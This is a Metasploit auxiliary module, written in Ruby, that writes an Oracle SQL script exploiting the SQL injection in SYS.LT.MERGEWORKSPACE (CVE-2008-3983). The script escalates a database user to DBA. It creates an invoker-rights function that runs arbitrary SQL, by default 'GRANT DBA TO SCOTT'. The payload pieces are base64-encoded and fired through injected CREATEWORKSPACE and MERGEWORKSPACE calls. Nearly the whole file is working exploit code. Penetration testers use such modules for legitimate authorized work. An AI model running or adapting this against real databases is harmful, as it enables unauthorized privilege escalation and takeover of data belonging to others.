##
# $Id: lt_MERGEWORKSPACE.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection in  SYS.LT.MERGEWORKSPACE Procedure.',
			'Description'    => %q{
					This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in
					SYS.LT.MERGEWORKSPACE procedure.
			},
			'Author'         => [ 'Sh2kerr <research[ad]dsecrg.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2008-3983' ],
					[ 'URL', 'http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml' ],
				],
			'DisclosureDate' => 'Jan 13 2009'))

			register_options( 
				[
					OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
					OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),
					OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql']),
					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
				
				], self.class)
	end

	def run
		name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

		function = %Q|
			
			CREATE OR REPLACE FUNCTION #{name} return varchar2
			authid current_user AS
			pragma autonomous_transaction;
			BEGIN
			EXECUTE IMMEDIATE '#{datastore['SQL']}';
			COMMIT;
			RETURN 'X';
			END;
			|

	

		prepare ="BEGIN SYS.LT.CREATEWORKSPACE('X'' and #{datastore['USER']}.#{name}()=''X');END;"
		
		exploiting ="BEGIN SYS.LT.MERGEWORKSPACE('X'' and #{datastore['USER']}.#{name}()=''X');END;"
		
		
		fun  = Rex::Text.encode_base64(function)
		prp  = Rex::Text.encode_base64(prepare)
		exp = Rex::Text.encode_base64(exploiting)
		

		sql = %Q|
			DECLARE
			#{rand1} VARCHAR2(32767);
			#{rand2} VARCHAR2(32767);
			#{rand3} VARCHAR2(32767);
			BEGIN
			#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun}')));
			EXECUTE IMMEDIATE #{rand1};
			EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name} TO PUBLIC';
			#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));
			EXECUTE IMMEDIATE #{rand2};
			#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp}')));
			EXECUTE IMMEDIATE #{rand3};
			END;
			/
			DROP FUNCTION #{name};
			|


		print_status("Creating '#{datastore['FILENAME']}' file ...")		
		file_create(sql)


	end

end 